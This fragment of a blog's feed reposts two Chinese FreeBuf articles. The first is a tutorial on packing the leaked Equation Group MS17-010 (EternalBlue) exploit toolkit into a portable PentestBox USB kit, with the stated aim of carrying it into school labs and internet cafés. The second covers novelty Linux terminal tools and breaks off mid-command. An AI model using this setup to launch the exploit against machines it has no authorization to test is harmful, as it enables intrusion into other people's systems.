      &lt;div id=&quot;contenttxt&quot;&gt;&lt;br&gt;                            &lt;p&gt;&lt;span style=&quot;color: rgb(239, 71, 71);&quot;&gt;&lt;b&gt;&lt;em&gt;&lt;/em&gt;&lt;/b&gt;&lt;/span&gt;&lt;span style=&quot;color: rgb(239, 71, 71);&quot;&gt;&lt;b&gt;本文原创作者：ssooking，本文属FreeBuf原创奖励计划，未经许可禁止转载&lt;/b&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;h2&gt;一. 前言&lt;/h2&gt;&lt;br&gt;&lt;p&gt;&lt;b style=&quot;color: rgb(0, 176, 80);&quot;&gt;前段时间Shadow Broker披露了 Windows大量漏洞，甚至爆出黑客组织 Equation Group 对于Windows 远程漏洞 MS17-010 的利用工具，该漏洞影响范围之广，堪称杀器。可以看看官方通告。大伙们也忙的热火朝天~~于是想着把攻击环境移植到u盘里，然后比如去学校机房，网吧。&lt;/b&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;这里分享一下个人的移植过程，以及在使用攻击代码过程中遇到的问题，思路就是利用现成的神器pentestbox，向里添加攻击代码以及其运行需要的python环境。&lt;/p&gt;&lt;br&gt;&lt;h2&gt;二. 环境移植过程&lt;/h2&gt;&lt;br&gt;&lt;p&gt;Pentest Box是一款Windows平台下预配置的便携式开源渗透测试环境，集成了各种编译运行环境，具体的可以到网上了解一下。&lt;/p&gt;&lt;br&gt;&lt;h3&gt;1. &amp;nbsp;工具准备：&lt;/h3&gt;&lt;br&gt;&lt;p&gt;Pentestbox:&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;a href=&quot;https://pentestbox.org/zh/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://pentestbox.org/zh/&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;方程式工具包: EQGRP_Lost_in_Translation&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;python环境&lt;/p&gt;&lt;br&gt;&lt;p&gt;必须在Python2.6 &amp;nbsp;和 pywin32-221环境下，如果你用其他环境，会报各种诸如模块/dll缺失等错误&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;a href=&quot;http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png&quot; src=&quot;http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;    &lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/4f1198f61d050b967c06615a030217b65.png&lt;/a&gt;“ alt=””&amp;gt;    &amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;Python2.6 &amp;nbsp;和 pywin32-221位数需要相同，我用的是32位的&lt;/p&gt;&lt;br&gt;&lt;p&gt;Python2.6.6 （32）&amp;nbsp;&lt;/p&gt;&lt;br&gt;&lt;p&gt;下载链接：&lt;a href=&quot;https://www.python.org/download/releases/2.6.6/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.python.org/download/releases/2.6.6/&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;p&gt;pywin32-221（32）&lt;/p&gt;&lt;br&gt;&lt;p&gt;下载链接：&lt;/p&gt;&lt;br&gt;&lt;p&gt;&lt;a href=&quot;https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/pywin32-221.win32-py2.6.exe/download&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;h3&gt;2. &amp;nbsp;Pentestbox下python2.6环境配置&lt;/h3&gt;&lt;br&gt;&lt;p&gt;分别安装，然后你会得到攻击包运行的python2.6环境&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png&quot; src=&quot;http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;    &lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/2e7c6548d0e1804ebb396c045a86c54b5.png&lt;/a&gt;“ alt=””&amp;gt;    &amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;在Python26\Lib\site-packages目录下，你会发现插件也已经安装    &lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png&quot; src=&quot;http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/fcc2e591488a0ea47f0171651a0102e15.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;然后把python26这个文件夹拷贝到你的pentestbox环境变量目录下：Pentestbox\base&lt;/p&gt;&lt;br&gt;&lt;p&gt;刚才你也可以直接装到pentestbox\base下&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png&quot; src=&quot;http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/0869acc49d502c30f1f8cbebcc64918c5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;然后我们添加python2.6环境变量,在Pentestbox \config\alias文件中加一行&lt;/p&gt;&lt;br&gt;&lt;p&gt;python26=”%pentestbox_ROOT%\base\Python26\python.exe” $&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png&quot; src=&quot;http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/22b61f61f49bd49a84c47233c70183ff5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;然后我们启动pentestbox，由于pentestbox通过线程注入挂钩cmd.exe来调用系统命令，因此杀软可能会提示警告，信任即可。    &lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png&quot; src=&quot;http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/034d2d767c5dc34b56cb644ce11248f65.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;这个时候，我们运行python26可以看到环境配置成功&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png&quot; src=&quot;http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/36751094820e1fadf2c59799d5cce3ef5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;3. 漏洞利用工具配置&lt;/p&gt;&lt;br&gt;&lt;p&gt;我们下载EQGRP_Lost_in_Translation工具包,修改windows目录下fb.py，去除不必要的代码&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png&quot; src=&quot;http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/9f10dff60e982831e4770c85ae5165ef5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png&quot; src=&quot;http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/43a1862f82eeb18bf6edb842ab109f4b5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;然后我们把windows文件夹复制到pentestbox目录下&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&amp;nbsp;&lt;a href=&quot;http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png&quot; src=&quot;http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/48fac7fdda1a9bbce4e5a0af3b7e46835.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;这里我把windows里的文件放到pentestbox根目录下的ms17-010文件夹内&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png&quot; src=&quot;http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/d72452ebfa42654d0cb397baaf63e4f05.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;我们进入ms07-010目录并执行python26 fb.py    &lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png&quot; src=&quot;http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/ee9fbfedf2540e5f10cd82e2ed2878a45.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;&lt;p&gt;这样我们就可以启动攻击程序了&lt;/p&gt;&lt;br&gt;&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png&quot; class=&quot;highslide-image&quot; onclick=&quot;return hs.expand(this);&quot; target=&quot;_blank&quot;&gt;&lt;img data-original=&quot;http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png&quot; src=&quot;http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png&quot; alt=&quot;&quot; style=&quot;display: inline;&quot;&gt;&lt;/a&gt;&lt;/p&gt;&lt;br&gt;&lt;noscript&gt;&amp;lt;img src=”&lt;a href=&quot;http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://image.3001.net/2017/04/2ef4f1cad48cd5eb4e581edb6ad7f11e5.png&lt;/a&gt;“ alt=””&amp;gt;&amp;lt;/p&amp;gt;&lt;/noscript&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞利用" scheme="http://yingzhzh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
      <category term="ms17-010" scheme="http://yingzhzh.github.io/tags/ms17-010/"/>
    
      <category term="永恒之蓝" scheme="http://yingzhzh.github.io/tags/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    
      <category term="pentestbox" scheme="http://yingzhzh.github.io/tags/pentestbox/"/>
    
  </entry>
  
  <entry>
    <title>没想到你是这样的Linux | 终端下有趣的命令合集</title>
    <link href="http://yingzhzh.github.io/2017/08/18/so-cool-shell/"/>
    <id>http://yingzhzh.github.io/2017/08/18/so-cool-shell/</id>
    <published>2017-08-18T07:28:32.000Z</published>
    <updated>2017-08-18T07:36:05.000Z</updated>
    
    <content type="html"><![CDATA[<div id="contenttxt"><br>                            <h2><span style="color: rgb(0, 0, 0);">前言</span><br></h2><br><p><b style="color: rgb(0, 176, 80);">刚开始接触Linux的我们，肯定认为Linux系统就是那种枯燥的终端界面。然而实际上Linux下的终端还是有很多种有趣的玩法<del></del></b></p><br><br><h2>toilet</h2><br><h3>简介</h3><br><p><code>toilet</code>能用字母拼写出更大字母的工具，具体拼出什么字由命令后面的参数决定，不仅如此，它还能打印出各种风格的效果，比如彩色，金属光泽等。</p><br><h3>安装</h3><br><pre><code class="hljs cs"><span class="token function" style="color:rgb(121,93,163);">apt-<span class="hljs-keyword">get</span></span> <span class="token function" style="color:rgb(121,93,163);">install</span> toilet<br></code></pre><br><h3>参数解释</h3><br><pre><code class="hljs bash">toilet <span class="hljs-_">-f</span> mono12 -F metal FreeBuf<br></code></pre><br><p>这里&nbsp;<code>mono12</code>是字体参数值,&nbsp;<code>meta</code>是颜色参数值&nbsp;<code>FreeBuf</code>是我们想要操作的字体。    <br>有如下字体可以选择:</p><br><pre><code class="hljs ruby">ctf@guoguang<span class="hljs-symbol">:/usr/share/figlet</span>$ ls<br>ascii12.tlf     bigascii9.tlf  circle.tlf   future.tlf  mono9.tlf      smascii9.tlf   smmono12.tlf<br>ascii9.tlf      bigmono12.tlf  emboss2.tlf  letter.tlf  pagga.tlf      smblock.tlf    smmono9.tlf<br>bigascii12.tlf  bigmono9.tlf   emboss.tlf   mono12.tlf  smascii12.tlf  smbraille.tlf  wideterm.tlf<br></code></pre><br><p>颜色参数有如下选项:</p><br><pre><code class="hljs ruby">ctf@guoguang<span class="hljs-symbol">:~</span>$ toilet –filter list<br>Available <span class="hljs-symbol">filters:</span><br><span class="hljs-string">“crop”</span><span class="hljs-symbol">:</span> crop unused blanks<br><span class="hljs-string">“gay”</span><span class="hljs-symbol">:</span> add a rainbow colour effect<br><span class="hljs-string">“metal”</span><span class="hljs-symbol">:</span> add a metallic colour effect<br><span class="hljs-string">“flip”</span><span class="hljs-symbol">:</span> flip horizontally<br><span class="hljs-string">“flop”</span><span class="hljs-symbol">:</span> flip vertically<br><span class="hljs-string">“180”</span><span class="hljs-symbol">:</span> rotate <span class="hljs-number">180</span> degrees<br><span class="hljs-string">“left”</span><span class="hljs-symbol">:</span> rotate <span class="hljs-number">90</span> degrees counterclockwise<br><span class="hljs-string">“right”</span><span class="hljs-symbol">:</span> rotate <span class="hljs-number">90</span> degrees clockwise<br><span class="hljs-string">“border”</span><span class="hljs-symbol">:</span> surround text with a border<br></code></pre><br><h3>效果演示</h3><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027021215532.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示" data-original="http://image.3001.net/images/20170814/15027021215532.png!small" src="http://image.3001.net/images/20170814/15027021215532.png!small" width="690" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”效果演示” src=”<a href="http://image.3001.net/images/20170814/15027021215532.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027021215532.png!small</a>“ width=”690” height=”840.7738998482549”&gt;    &lt;/p&gt;</noscript><br><br><a id="more"></a><br><h2>screenfetch</h2><br><h3>简介</h3><br><p>screenFetch 是一个能够在截屏中显示系统/主题信息的命令行脚本。它可以在 Linux，OS X，FreeBSD 以及其它的许多类Unix系统上使用。</p><br><h3>安装</h3><br><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> <span class="token function" style="color:rgb(121,93,163);">install</span> screenfetch<br></code></pre><br><h2>效果演示</h2><br><pre><code class="hljs nginx"><span class="hljs-attribute">screenfetch</span><br></code></pre><br><p style="text-align: center;">&nbsp;<a href="http://image.3001.net/images/20170816/15028744534796.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="效果演示.png" data-original="http://image.3001.net/images/20170816/15028744534796.png!small" src="http://image.3001.net/images/20170816/15028744534796.png!small" width="690" style="display: inline;"></a></p><br><noscript>&lt;img alt=”效果演示.png” src=”<a href="http://image.3001.net/images/20170816/15028744534796.png!small" target="_blank" rel="external">http://image.3001.net/images/20170816/15028744534796.png!small</a>“ width=”690” height=”297”&gt;&lt;/p&gt;</noscript><br><p>还可以手动设置<code>logo颜色</code>和<code>文字颜色</code></p><br><pre><code class="hljs css"><span class="hljs-selector-tag">screenfetch</span> <span class="hljs-selector-tag">-c</span> <span class="token punctuation"><span class="hljs-selector-attr">[</span></span><span class="hljs-selector-attr">0-9</span><span class="token punctuation"><span class="hljs-selector-attr">]</span></span>,<span class="token punctuation"><span class="hljs-selector-attr">[</span></span><span class="hljs-selector-attr">0-9</span><span class="token punctuation"><span class="hljs-selector-attr">]</span></span> <span class="token comment" style="color:rgb(150,152,150);">#第一个参数是<span class="hljs-selector-tag">logo</span>颜色 第2个参数是文字颜色 </span><br><span class="hljs-selector-tag">screenfetch</span> <span class="hljs-selector-tag">-c</span> 6,9<br></code></pre><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027021793373.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="显示其他发行版的logo" data-original="http://image.3001.net/images/20170814/15027021793373.png!small" src="http://image.3001.net/images/20170814/15027021793373.png!small" width="690" style="display: inline;"></a>    <br>显示其他发行版的logo</p><br><noscript>&lt;img alt=”显示其他发行版的logo” src=”<a href="http://image.3001.net/images/20170814/15027021793373.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027021793373.png!small</a>“ width=”690” height=”286”&gt;    &lt;br /&gt;显示其他发行版的logo&lt;/p&gt;</noscript><br><pre><code class="hljs nginx"><span class="hljs-attribute">screenfetch</span> -A 发行版<br></code></pre><br><p>现在知道支持logo的发版本有如下:</p><br><pre><code class="hljs nginx"><span class="hljs-attribute">screenfetch</span> -A Debian<br>screenfetch -A Ubuntu<br>screenfetch -A Android<br>screenfetch -A Windows<br>screenfetch -A Fedora<br>screenfetch -A FreeBSD<br>screenfetch -A Slackware<br>screenfetch -A Mint<br>screenfetch -A LMDE<br>screenfetch -A OpenBSD<br>screenfetch -A Peppermint<br>screenfetch -A Linux<br></code></pre><br><p style="">挑选了一些经典的logo演示:</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170816/15028744267500.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="经典 logo 演示.png" data-original="http://image.3001.net/images/20170816/15028744267500.png!small" src="http://image.3001.net/images/20170816/15028744267500.png!small" width="690" style="display: inline;"></a></p><br><noscript>&lt;img alt=”经典 logo 演示.png” src=”<a href="http://image.3001.net/images/20170816/15028744267500.png!small" target="_blank" rel="external">http://image.3001.net/images/20170816/15028744267500.png!small</a>“ width=”690” height=”388”&gt;&lt;/p&gt;</noscript><br><p style="">终端动画演示效果:</p><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027022366484.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="终端动画演示效果" data-original="http://image.3001.net/images/20170814/15027022366484.gif!small" src="http://image.3001.net/images/20170814/15027022366484.gif!small" width="690" style="display: inline;"></a></p><br><noscript>&lt;img alt=”终端动画演示效果” src=”<a href="http://image.3001.net/images/20170814/15027022366484.gif!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027022366484.gif!small</a>“ width=”690” height=”347”&gt;&lt;/p&gt;</noscript><br><h2><span style="">linuxlogo</span></h2><br><h3>简介</h3><br><p><span style="">linuxlogo</span>（或叫 linux_logo）是一款在Linux命令行下用彩色 ANSI 代码生成附带有系统信息的发行版徽标的工具。与徽标一同显示的系统信息包括 ： Linux 内核版本，最近一次编译Linux内核的时间，处理器/核心数量，速度，制造商，以及哪一代处理器。它还能显示总共的物理内存大小。</p><br><h3>安装</h3><br><pre><code class="hljs nginx"><span class="hljs-attribute">apt</span> <span class="token function" style="color:rgb(121,93,163);">install</span> linuxlogo<br></code></pre><br><p style="text-align: center;"><a href="http://image.3001.net/images/20170814/15027022515355.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="安装" data-original="http://image.3001.net/images/20170814/15027022515355.png!small" src="http://image.3001.net/images/20170814/15027022515355.png!small" width="690" style="display: inline;"></a>    </p><br><noscript>&lt;img alt=”安装” src=”<a href="http://image.3001.net/images/20170814/15027022515355.png!small" target="_blank" rel="external">http://image.3001.net/images/20170814/15027022515355.png!small</a>“ width=”690” height=”352”&gt;    &lt;/p&gt;</noscript><br><h3>参数解释</h3><br><pre><code class="hljs sql">ctf@guoguang:~$ linuxlogo -L list   #列出了所以支持显示logo的发行版<br><br>Available Built-in Logos:<br>  Num Type  Ascii Name    Description<br>  1 Classic Yes aix   AIX Logo<br>  2 Classic Yes bsd   FreeBSD Logo<br>  3 Banner  Yes bsd_banner  FreeBSD Logo<br>  4 Classic Yes irix    Irix Logo<br>  5 Classic Yes openbsd   OpenBSD Logo<br>  6 Banner  Yes openbsd_banner  OpenBSD Logo<br>  7 Banner  Yes solaris   The Default Banner Logos<br>  8 Banner  Yes banner-simp Simplified Banner Logo<br>  9 Banner  Yes banner    The Default Banner Logo<br>  10  Classic Yes classic-nodots  The Classic Logo, No Periods<br>  11  Classic Yes classic-simp  Classic No Dots Or Letters<br>  12  Classic Yes classic   The Default Classic Logo<br>  13  Banner  Yes blankon   An ASCII BlankOn logo<br>  14  Classic Yes core    Core Linux Logo<br>  15  Banner  Yes debian_banner_2 Debian Banner 2<br>  16  Banner  Yes debian_banner Debian Banner (white)<br>  17  Classic Yes debian_old  Debian Old Penguin Logos<br>  18  Classic Yes debian    Debian Swirl Logos<br>  19  Classic Yes gnu_linux Classic GNU/Linux<br>  20  Banner  Yes mandrake_banner Mandrake(TM) Linux Banner<br>  21  Banner  Yes mandrake  Mandrakelinux(TM) Banner<br>  22  Banner  Yes mandriva  Mandriva(TM) Linux Banner<br>  23  Banner  Yes pld   PLD Linux banner<br>  24  Classic Yes raspi   An ASCII Raspberry Pi logo<br>  25  Banner  Yes redhat    RedHat Banner (white)<br>  26  Banner  Yes slackware Slackware Logo<br>  27  Banner  Yes sme   SME Server Banner Logo<br>  28  Banner  Yes sourcemage_ban  Source Mage GNU/Linux banner<br>  29  Banner  Yes sourcemage  Source Mage GNU/Linux large<br>  30  Banner  Yes suse    SUSE Logo<br>  31  Banner  Yes ubuntu    Ubuntu Logo<br><br><span class="hljs-keyword">Do</span> <span class="hljs-string">“linux_logo -L num”</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">num</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">from</span> above <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the appropriate logo.<br>Remember <span class="hljs-keyword">to</span> also <span class="hljs-keyword">use</span> -a <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">ascii</span> <span class="hljs-keyword">version</span>.<br></code></pre><br><h3>效果演示</h3><br><p>下面附上 一条命令 每间隔1秒输出各大发行版logo的信息:</p><br><pre><code class="hljs bash"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..31};<span class="hljs-keyword">do</span> linux<em>logo 